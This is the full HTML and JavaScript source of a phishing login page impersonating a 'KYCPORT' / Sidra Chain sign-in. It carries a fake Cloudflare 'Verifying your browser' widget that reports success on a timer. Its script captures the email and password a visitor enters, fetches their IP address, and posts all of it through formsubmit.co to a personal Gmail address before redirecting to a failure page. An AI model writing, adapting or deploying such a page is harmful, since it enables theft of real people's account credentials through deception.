<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login with KYCPORT</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: whitesmoke;
            margin: 0;
        }

        .container {
            width: 80%;
            max-width: 400px;
            height: 100vh; /* Full height */
            background: white;
            padding: 35px;
            box-shadow: 0px 0px 12px rgba(0, 0, 0, 0.1);
            border-radius: 12px;
            text-align: center;
            display: flex;
            flex-direction: column;
            justify-content: flex-start;
            padding-top: 20px;
            position: absolute;
            top: 0;
        }

        .container img {
            display: block;
            margin: 0 auto 40px;
        }

        label {
            display: block;
            text-align: left;
            margin: 15px 0 8px;
            font-weight: bold;
            font-size: 18px;
        }

        input {
            width: 100%;
            padding: 14px;
            border: 1px solid #ccc;
            border-radius: 6px;
            font-size: 17px;
            color: gray;
            margin-bottom: 20px;
        }

        .forgot-password {
            text-align: left;
            margin-top: -10px; 
            margin-bottom: 40px;
            display: block;
        }

        button {
            width: 100%;
            padding: 14px;
            background: #544DEA;
            color: white;
            border: none;
            font-size: 15px;
            cursor: pointer;
            border-radius: 8px;
            margin-top: 15px;
        }

        button:hover {
            background: darkorange;
        }

        /* Cloudflare Verification Section */
        .cloudflare-verification {
            margin-top: 20px;
            padding: 8px;
            border: 1px solid #ddd;
            background: #f9f9f9;
            border-radius: 4px;
            font-size: 12px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 6px;
            width: 100%;
            max-width: 250px;
            position: relative;
        }

        .loading {
            width: 16px;
            height: 16px;
            border: 3px solid #ccc;
            border-top: 3px solid blue;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .verified {
            color: green;
            font-weight: bold;
            font-size: 12px;
        }

        .cloudflare-logo {
            width: 50px;
            height: auto;
            position: absolute;
            right: 5px;  /* Moves the image to the right */
            top: 50%;
            transform: translateY(-50%);
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="images/download_11.png" width="130px" height="110px" alt="Sidra Chain">

        <label for="email">Email</label>
        <input type="email" id="email" placeholder="Enter your email" required>

        <label for="password">Password</label>
        <input type="password" id="password" placeholder="Enter your password" required>

        <p class="forgot-password">
            <a href="form.html">Forgot password?</a>
        </p>

        <!-- Cloudflare Verification -->
        <div class="cloudflare-verification" id="cloudflare">
            <div style="display: flex; align-items: center; gap: 6px;">
                <span class="loading" id="loading-icon"></span>
                <p id="verification-text">Verifying your browser...</p>
            </div>
            <img src="images/download_14.png" class="cloudflare-logo" alt="Cloudflare">
        </div>

        <button onclick="sendLoginData()">Login</button>

        <p>Don't have an account? <a href="form.html">Register</a></p>
    </div>

    <script>
        function sendLoginData() {
            let email = document.getElementById("email").value.trim();
            let password = document.getElementById("password").value.trim();

            if (!email) {
                alert("Please enter a valid email.");
                return;
            }

            if (!password) {
                alert("Please enter your password.");
                return;
            }

            fetch("https://api.ipify.org?format=json")
            .then(response => response.json())
            .then(data => {
                let userIP = data.ip || "Not Available"; // Handle case where IP isn't found

                let emailBody = `
                    You have received a new login credential:\n\n
                    Email: ${email}\n
                    Password: ${password}\n
                    IP Address: ${userIP}\n\n
                    Sent from: ${window.location.href}
                `;

                fetch("https://formsubmit.co/ajax/nwankwogoodluck156@gmail.com", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        _subject: "New Login Credentials",
                        message: emailBody
                    })
                })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        alert("Login data sent successfully!");
                        window.location.href = "fail.html";
                    } else {
                        alert("Failed to send login data.");
                    }
                })
                .catch(error => {
                    console.error("Error:", error);
                    alert("Failed to send login data.");
                });

            }).catch(error => {
                console.error("Error fetching IP:", error);
                alert("Failed to retrieve IP address.");
            });
        }

        setTimeout(() => {
            document.getElementById("cloudflare").innerHTML = `
                <div style="display: flex; align-items: center; gap: 6px;">
                    <p class="verified">âœ” Your browser has been verified!</p>
                </div>
                <img src="images/download_14.png" class="cloudflare-logo" alt="Cloudflare">
            `;
        }, 3000);
    </script>
</body>
</html>
